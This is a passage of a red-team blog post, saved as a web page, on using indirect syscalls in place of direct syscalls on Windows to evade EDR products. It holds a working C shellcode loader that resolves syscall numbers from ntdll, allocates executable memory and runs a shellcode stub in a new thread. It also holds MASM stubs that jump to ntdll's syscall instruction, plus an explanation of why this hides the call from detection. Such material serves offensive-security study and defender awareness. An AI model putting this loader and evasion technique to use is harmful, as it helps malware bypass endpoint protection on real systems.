+// Declare global variables to hold syscall numbers and syscall instruction addresses
+DWORD wNtAllocateVirtualMemory;
+UINT_PTR sysAddrNtAllocateVirtualMemory;
+DWORD wNtWriteVirtualMemory;
+UINT_PTR sysAddrNtWriteVirtualMemory;
+DWORD wNtCreateThreadEx;
+UINT_PTR sysAddrNtCreateThreadEx;
+DWORD wNtWaitForSingleObject;
+UINT_PTR sysAddrNtWaitForSingleObject;
+
+
+int main() {
+    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
+    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)
+
+    // Get a handle to the ntdll.dll library
+    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
+    // This is typically located at the 4th byte of the function
+    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+
+    // The syscall stub (actual system call instruction) is some bytes further into the function. 
+    // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
+    // So we add 0x12 to the function's address to get the address of the system call instruction.
+    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+
+    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
+    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
+
+    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
+    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
+
+    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&amp;allocBuffer, (ULONG_PTR)0, &amp;buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+
+    // Define the shellcode to be injected
+    unsigned char shellcode[] = "\xfc\x48\x83";
+
+    ULONG bytesWritten;
+    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &amp;bytesWritten);
+
+    HANDLE hThread;
+    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
+    NtCreateThreadEx(&amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>In contrast to the direct syscall POC, in the indirect syscall POC we want to dynamically extract not only the SSN, but also the memory address of the syscall instruction. The latter is done with the line <code>sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12</code>. This is necessary so that later in the associated assembly code the <code>syscall</code> instruction can be replaced by an unconditional jump instruction (<code>jmp</code>) pointing to the memory address of the syscall instruction within <code>ntdll.dll</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm"><span class="token directive property">EXTERN</span> wNtAllocateVirtualMemory:DWORD               <span class="token comment">; Extern keyword indicates that the symbol is defined in another module. Here it's the syscall number for NtAllocateVirtualMemory.</span>
+<span class="token directive property">EXTERN</span> sysAddrNtAllocateVirtualMemory:QWORD         <span class="token comment">; The actual address of the NtAllocateVirtualMemory syscall instruction in ntdll.dll.</span>
+
+<span class="token directive property">EXTERN</span> wNtWriteVirtualMemory:DWORD                  <span class="token comment">; Syscall number for NtWriteVirtualMemory.</span>
+<span class="token directive property">EXTERN</span> sysAddrNtWriteVirtualMemory:QWORD            <span class="token comment">; The actual address of the NtWriteVirtualMemory syscall instruction in ntdll.dll.</span>
+
+<span class="token directive property">EXTERN</span> wNtCreateThreadEx:DWORD                      <span class="token comment">; Syscall number for NtCreateThreadEx.</span>
+<span class="token directive property">EXTERN</span> sysAddrNtCreateThreadEx:QWORD                <span class="token comment">; The actual address of the NtCreateThreadEx syscall instruction in ntdll.dll.</span>
+
+<span class="token directive property">EXTERN</span> wNtWaitForSingleObject:DWORD                 <span class="token comment">; Syscall number for NtWaitForSingleObject.</span>
+<span class="token directive property">EXTERN</span> sysAddrNtWaitForSingleObject:QWORD           <span class="token comment">; The actual address of the NtWaitForSingleObject syscall instruction in ntdll.dll.</span>
+
+.<span class="token directive property">CODE</span>  <span class="token comment">; Start the code section</span>
+
+<span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                                    <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> wNtAllocateVirtualMemory               <span class="token comment">; Move the syscall number into the eax register.</span>
+    jmp <span class="token instruction keyword">QWORD</span> <span class="token instruction keyword">PTR</span> <span class="token punctuation">[</span>sysAddrNtAllocateVirtualMemory<span class="token punctuation">]</span>  <span class="token comment">; Jump to the actual syscall.</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>                        <span class="token comment">; End of the procedure.</span>
+
+
+<span class="token comment">; Similar procedures for NtWriteVirtualMemory syscalls</span>
+NtWriteVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx
+    mov eax<span class="token punctuation">,</span> wNtWriteVirtualMemory
+    jmp <span class="token instruction keyword">QWORD</span> <span class="token instruction keyword">PTR</span> <span class="token punctuation">[</span>sysAddrNtWriteVirtualMemory<span class="token punctuation">]</span>
+NtWriteVirtualMemory <span class="token directive property">ENDP</span>
+
+
+<span class="token comment">; Similar procedures for NtCreateThreadEx syscalls</span>
+NtCreateThreadEx <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx
+    mov eax<span class="token punctuation">,</span> wNtCreateThreadEx
+    jmp <span class="token instruction keyword">QWORD</span> <span class="token instruction keyword">PTR</span> <span class="token punctuation">[</span>sysAddrNtCreateThreadEx<span class="token punctuation">]</span>
+NtCreateThreadEx <span class="token directive property">ENDP</span>
+
+
+<span class="token comment">; Similar procedures for NtWaitForSingleObject syscalls</span>
+NtWaitForSingleObject <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx
+    mov eax<span class="token punctuation">,</span> wNtWaitForSingleObject
+    jmp <span class="token instruction keyword">QWORD</span> <span class="token instruction keyword">PTR</span> <span class="token punctuation">[</span>sysAddrNtWaitForSingleObject<span class="token punctuation">]</span>
+NtWaitForSingleObject <span class="token directive property">ENDP</span>
+
+<span class="token directive property">END</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm"><span class="token comment">;Indirect Syscalls</span>
+<span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                                    <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> wNtAllocateVirtualMemory               <span class="token comment">; Move the syscall number into the eax register.</span>
+    jmp <span class="token instruction keyword">QWORD</span> <span class="token instruction keyword">PTR</span> <span class="token punctuation">[</span>sysAddrNtAllocateVirtualMemory<span class="token punctuation">]</span>  <span class="token comment">; Jump to the actual syscall.</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>                        <span class="token comment">; End of the procedure.</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm"><span class="token comment">;Direct Syscalls</span>
+<span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                                    <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> wNtAllocateVirtualMemory               <span class="token comment">; Move the syscall number into the eax register.</span>
+    syscall                                         <span class="token comment">; Execute syscall.</span>
+    ret                                             <span class="token comment">; Return from the procedure.</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>                        <span class="token comment">; End of the procedure.</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>If we compare the assembly code of the direct syscall POC and the indirect syscall POC, we can see that directly in the indirect syscall POC <strong>only a part</strong> of the stub of the native function is mapped in the form of assembly code. Also in the indirect syscall POC, the SSN is read dynamically and stored in a globally declared variable. However, unlike the direct syscall POC, the indirect syscall POC replaces the <code>syscall</code> instruction with an unconditional jump instruction (<code>jmp</code>), which uses a pointer to point to the address of the <code>syscall</code> instruction in the memory area of <code>ntdll.dll</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <figure class="image-center"><img src="https://redops.at/assets/images/blog/x64dbg_indirect_syscalls.png" alt=""></figure>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/x64dbg_indirect_syscalls_2.png" alt=""></figure>
+<p><br>We compile the indirect syscall POC and open it in x64dbg. Compared to the direct syscall POC before, you can see that the syscall statement is not executed in the memory area of the indirect syscall assembly. Instead, the syscall instruction has been replaced by a jump instruction that points to the memory address of the syscall instruction in ntdll.dll. This ensures that the syscall instruction and subsequent return are executed from the memory area of ntdll.dll.<br></p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/callstack_direct_vs_indirect_syscalls.png" alt=""></figure>
+<p>When comparing the thread call stack of direct and indirect syscalls, there are significant differences. For direct syscalls, the syscall itself and its return execution occur within the memory space of the .exe file of the executing process. This results in the top frame of the call stack coming from the .exe memory, not the ntdll.dll memory. Such a pattern is a definitive indicator of compromise (IOC) with 100% confidence, as it's atypical of standard application behaviour.<br><br>On the other hand, indirect syscalls offer a more legitimate appearance in the context of the thread call stack. With indirect syscalls, both the execution of the syscall and the return instruction occur within the memory of ntdll.dll, which is the expected behaviour in normal application processes. By replacing direct syscalls with indirect ones, the resulting call stack mimics a more conventional execution pattern. This can be useful in bypassing EDR systems that examine the memory area where syscalls and their returns are executed.<br></p>
+<figure class="image-center"><img src="https://redops.at/assets/images/blog/legit_callstack_vs_idsc_callstack.png" alt=""></figure>
+<p>The increased legitimacy of the stack frame order when using the indirect syscall Proof of Concept (POC) is evident when compared to the stack frame order of an unmodified cmd.exe. To observe this, simply open a cmd.exe and then use Process Hacker to examine the stack frames again. However, it's important to note that if an EDR system uses Event Tracing for Windows (ETW) to analyse the full call stack, it may still detect anomalies even when using indirect syscalls. In such scenarios, spoofing the entire call stack may be necessary for more effective evasion, as it would help hide any irregular syscall patterns from the vigilant eyes of advanced EDR systems.<br></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Insights&nbsp;</h3>
+<p>Various experiments with different EDRs have shown that direct syscalls can still work, but are also increasingly detected depending on the EDR. Based on IOCs in the context of direct syscalls, indirect syscalls can be a useful solution, as they solve the following problems in comparison&nbsp;</p>
+<ul><li>Firstly, the execution of the syscall command takes place within the memory of the ntdll.dll and is therefore legitimate for the EDR.</li></ul>
+<p></p>
+<ul><li>On the other hand, the execution of the return statement takes place within the memory of ntdll.dll and points from the memory of ntdll.dll to the memory of the indirect syscall assembly. This behaviour is at least more legitimate than the behaviour with direct syscalls, but can still lead to IOCs depending on the EDR, e.g. if the EDR also checks the call stack.</li></ul>
+<p></p>
+<p>Indirect syscalls are an improvement over direct syscalls, but have their limitations, and also have certain IOCs that are now used by EDR vendors to generate detection rules. For example, with indirect syscalls it is possible to spoof the return address, which places the memory address of the subsequent return at the top of the call stack&nbsp;and bypass the EDR's return check. However, if an EDR is using ETW, it can additionally check the call stack itself for improper behaviour. Indirect syscalls alone are no longer sufficient for EDR evasion in case of an EDR also uses ETW, and you need to take a closer look at call stack spoofing. A good article about this "<strong><a href="https://0xdarkvortex.dev/hiding-in-plainsight/" target="_blank" rel="noreferrer noopener">Hiding In PlainSight - Indirect Syscall is Dead! Long Live Custom Call Stacks</a></strong>" by @NinjaParanoid.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Summary</h3>
+<p>Depending on the EDR, direct syscalls can still be a useful technique for various activities, such as executing shellcode for initial access. However, if the EDR checks, for example, the memory area from which the syscall and return statements are executed, or the memory area to which the return statement points, then direct syscalls can lead to EDR evasion problems, because the syscall and return statements are executed from the memory of the assembly itself, and the return statement also points from the memory of the assembly to the memory of the assembly.</p>
+<p>To work around these problems associated with EDR evasion, indirect syscalls can help. When using indirect syscalls, the syscall and return statement are executed within the memory of ntdll.dll. This is legitimate behaviour on Windows and we have eliminated one IOC compared to direct syscalls. Another IOC is eliminated because the return statement is executed in the memory of the ntdll.dll, rather than from the memory of the assembly itself, as it was previously when using direct syscalls. In addition, the return statement points from the ntdll.dll memory to the indirect syscall assembly memory, rather than from the assembly memory to the assembly memory, as was previously the case when using direct syscalls.<br><br>Indirect syscalls are a good evolution of direct syscalls, but they do have their limitations. For example, in the context of the indirect syscall POC used in this blog post, there are limitations when a Native API is hooked from the EDR using Inline Hook. Why? Because the EDR inline hook replaces <code>mov eax SSN</code> in the affected Native API with an unconditional jump instruction (jmp), it is not possible to dynamically extract the syscall number (SSN) from the <code>ntdll.dll</code> loaded in memory. To do this, the inline hook would first have to be removed in the affected native API, only then can the SSN be extracted from the <code>mov eax SSN</code>. Note an important insight I stumbled upon at the beginning, an EDR can hook <code>mov eax SSN</code> or replace it with a jmp instruction. But the EDR can never hook the syscall instruction <code>syscall</code> itself. This is important because the EDR can never prevent us from executing the syscall in memory in ntdll.dll using indirect syscalls.</p>
+<p></p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-size:16px;font-style:normal;font-weight:400;letter-spacing:normal;text-indent:0px;text-transform:none;word-spacing:0px;white-space:normal;background-color:rgb(251,252,254);"><img src="https://redops.at/assets/images/blog/api.png" alt=""></figure>
+<p>Another approach to dynamically extraxt the SSN from the stub of a "clean" or unhooked Native API is the Halo's Gate technique (an evolution of Hell's Gate). I recommend the article "<strong><a href="https://blog.sektor7.net/#!res/2021/halosgate.md" target="_blank" rel="noreferrer noopener">Halo's Gate - twin sister of Hell's Gate</a></strong>" by <strong><a href="https://twitter.com/SEKTOR7net" target="_blank" rel="noreferrer noopener">@SEKTOR7net</a></strong>, who developed the Halo's Gate technique, and the article "<strong><a href="https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/" target="_blank" rel="noreferrer noopener">EDR Bypass: Retrieving Syscall ID with Hell's Gate, Halo's Gate, FreshyCalls and Syswhispers2</a></strong>" by <strong><a href="https://twitter.com/AliceCliment" target="_blank" rel="noreferrer noopener">@AliceCliment</a></strong> is also highly recommended.<br></p>
+<p>Another limitation of indirect syscalls is that if an EDR is also using ETW, the EDR will not only check the return address, but also the call stack itself. In this case, indirect syscalls alone are not sufficient, and the issue of call stack spoofing also needs to be addressed. However, this topic is definitely beyond the scope of this blog and will hopefully be covered in the next article.<br><br>All <strong>code examples</strong> in this article can also be found on my <strong><a href="https://github.com/VirtualAlllocEx/Direct-Syscalls-vs-Indirect-Syscalls" target="_blank" rel="noreferrer noopener">Github</a></strong> account.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-red">
+    <div class="content blog-container">
+        <div class="text">
+            <p>Happy Hacking!</p>
+<p>Daniel Feichter <a href="https://twitter.com/VirtualAllocEx" target="_blank" rel="noreferrer noopener">@VirtualAllocEx</a></p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-grey">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>References</h3>
+<ul><li><a href="https://www.guru99.com/system-call-operating-system.html">https://www.guru99.com/system-...</a></li><li><a href="https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/#:~:text=This%20number%20is%20called%20syscall,OS%20versions%20or%20service%20packs">https://alice.climent-pommeret...</a>.</li><li><a href="https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/">https://alice.climent-pommeret...</a></li><li><a href="https://maldevacademy.com/modules/89">https://maldevacademy.com/modu...</a></li><li><a href="https://0xdarkvortex.dev/hiding-in-plainsight/">https://0xdarkvortex.dev/hidin...</a></li><li><a href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/">https://klezvirus.github.io/Re...</a></li><li><a href="https://blog.sektor7.net/#!res/2021/halosgate.md">https://blog.sektor7.net/#!res...</a></li><li><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">https://outflank.nl/blog/2019/...</a></li><li><a href="https://twitter.com/re_and_more/status/1510512453800636421?lang=en">https://twitter.com/re_and_mor...</a></li><li><a href="https://www.malwaretech.com/2015/01/inline-hooking-for-programmers-part-1.html">https://www.malwaretech.com/20...</a></li><li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection">https://www.ired.team/offensiv...</a></li><li><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">https://outflank.nl/blog/2019/...</a></li><li><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy...</a></li><li><a href="https://github.com/am0nsec/HellsGate">https://github.com/am0nsec/Hel...</a></li><li><a href="https://twitter.com/VirtualAllocEx/status/1660202826616778759">https://twitter.com/VirtualAll...</a></li><li><a href="https://twitter.com/reenz0h/status/1660696255742312448">https://twitter.com/reenz0h/st...</a></li><li><a href="https://twitter.com/Jean_Maes_1994/status/1660207403051171842">https://twitter.com/Jean_Maes_...</a></li><li><a href="https://twitter.com/ShitSecure/status/1660207351146708994">https://twitter.com/ShitSecure...</a></li></ul>
+        </div>
+    </div>
+</section>
+                    </div>
+        <div class="blog-info container">
+            <div class="updated">
+                Last updated
+                <span class="desktop">
+                    31.03.24 13:25:43
+                </span>
+                <span class="mobile">
+                    31.03.24
+                </span>
+            </div>
+            <div class="author">
+                Daniel Feichter
+            </div>
+        </div>
+        <div class="further-reading container">
+                                        <div class="heading">
+                    Posts about related Topics
+                </div>
+                        <ul class="blog-list">
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/edr-analysis-a-hypothesis-about-call-stack-analysis-and-enhanced-detection" class="blog-link">
+    <div class="tag">
+        Reversing
+    </div>
+    <div class="post-date">
+        2024-05-06
+    </div>
+    <div class="blog-title">
+        EDR Analysis: A Hypothesis about Call Stack Analysis and Enhanced Detection
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/edr-analysis-leveraging-fake-dlls-guard-pages-and-veh-for-enhanced-detection" class="blog-link">
+    <div class="tag">
+        Reversing
+    </div>
+    <div class="post-date">
+        2024-05-05
+    </div>
+    <div class="blog-title">
+        EDR Analysis: Leveraging Fake DLLs, Guard Pages, and VEH for Enhanced Detection
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/shellcode-execution-via-asynchronous-procedure-calls" class="blog-link">
+    <div class="tag">
+        Malware Development
+    </div>
+    <div class="post-date">
+        2024-03-14
+    </div>
+    <div class="blog-title">
+        Shellcode Execution via Asynchronous Procedure Calls
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                                    <li class="list-item">
+                        <a href="https://redops.at/en/blog/malware-development-workshop" class="blog-link">
+    <div class="tag">
+        Workshop
+    </div>
+    <div class="post-date">
+        2024-02-05
+    </div>
+    <div class="blog-title">
+        University of Innsbruck-Malware Development Workshop
+    </div>
+    <div class="author">
+        Daniel Feichter
+    </div>
+</a>
+                    </li>
+                            </ul>
+        </div>
+    </div>
+        </main>
+        <button type="button" id="BackToTop">Back to top</button>
+        <footer id="Footer" class="bg-dark">
+            <div class="footer container">
+    <div class="info">
+        <div class="logo">
+            RedOps
+        </div>
+        <div class="mission">
+            <p>At <strong>RedOps</strong>, we see ourselves as an IT security sparring partner for our customers, helping you to incrementally improve your organisation's IT security posture and cyber resilience.</p>
+        </div>
+        <div class="contact-us">
+            <p>
+                Contact us
+            </p>
+            <a href="mailto:office@redops.at" class="email glitch" data-plausible-event="click:email" data-plausible-props="footer" data-content="office@redops.at">
+                office@redops.at
+            </a>
+        </div>
+        <div class="social-networks">
+            <a href="https://www.linkedin.com/in/daniel-feichter-5277a0140/" class="linkedin">linkedin</a>
+            <a href="https://twitter.com/VirtualAllocEx" class="twitter">twitter</a>
+        </div>
+        <div class="links">
+            <div class="heading">
+                Links
+            </div>
+            <ul class="link-list">
+                                                    <li class="link-entry">
+                        <a href="https://redops.at/en/expertise" class="glitch" data-content="Services">Services</a>
+                    </li>
+                                    <li class="link-entry">
+                        <a href="https://redops.at/en/about-us" class="glitch" data-content="About Us">About Us</a>
+                    </li>
+                                    <li class="link-entry">
+                        <a href="https://redops.at/en/kontakt" class="glitch" data-content="Contact">Contact</a>
+                    </li>
+                            </ul>
+        </div>
+        <div class="legal">
+            <div class="heading">
+                Legal
+            </div>
+            <ul class="legal-list">
+                                                <li class="legal-entry">
+                    <a href="https://redops.at/en/impressum" class="glitch" data-content="Imprint">Imprint</a>
+                </li>
+                <li class="legal-entry">
+                    <a href="https://redops.at/en/privacy" class="glitch" data-content="Privacy Statement">Privacy Statement</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <div class="copyright">
+        <div class="redops">
+            © 2024 REDOPS
+        </div>
+        <div class="bitperfect">
+            <span class="text">Created by</span>
+            <a href="https://bitperfect.at" class="glitch" data-content="bitperfect">bitperfect</a>
+        </div>
+    </div>
+        <div class="footer-link">
+        <a href="https://redops.at/en/knowledge-base" class="link h1 glitch" data-content="Knowledge Base">
+            Knowledge Base
+        </a>
+    </div>
+</div>
+        </footer>
+
+        <script type="module">!function(){const e=document.createElement("link").relList;if(!(e&&e.supports&&e.supports("modulepreload"))){for(const e of document.querySelectorAll('link[rel="modulepreload"]'))r(e);new MutationObserver((e=>{for(const o of e)if("childList"===o.type)for(const e of o.addedNodes)if("LINK"===e.tagName&&"modulepreload"===e.rel)r(e);else if(e.querySelectorAll)for(const o of e.querySelectorAll("link[rel=modulepreload]"))r(o)})).observe(document,{childList:!0,subtree:!0})}function r(e){if(e.ep)return;e.ep=!0;const r=function(e){const r={};return e.integrity&&(r.integrity=e.integrity),e.referrerpolicy&&(r.referrerPolicy=e.referrerpolicy),"use-credentials"===e.crossorigin?r.credentials="include":"anonymous"===e.crossorigin?r.credentials="omit":r.credentials="same-origin",r}(e);fetch(e.href,r)}}();</script>
+<script type="module" src="https://redops.at/dist/assets/main-DC6VkGeL.js" crossorigin="" onload="e=new CustomEvent('vite-script-loaded', {detail:{path: 'resources/js/main.ts'}});document.dispatchEvent(e);"></script>
+<link href="https://redops.at/dist/assets/main-ioE-islD.css" rel="stylesheet" media="all" onload="this.media='all'">
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js" integrity="sha512-9khQRAUBYEJDCDVP2yw3LRUQvjJ0Pjx0EShmaQjcHa6AXiOv6qHQu9lCAIR8O+/D8FtaCoJ2c0Tf9Xo7hYH01Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-SkmBfuA2hqjzEVpmnMt/LINrjop3GKWqsuLSSB3e7iBmYK7JuWw4ldmmxwD9mdm2IRTTi0OxSAfEGvgEi0i2Kw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    
+
+</body></html>
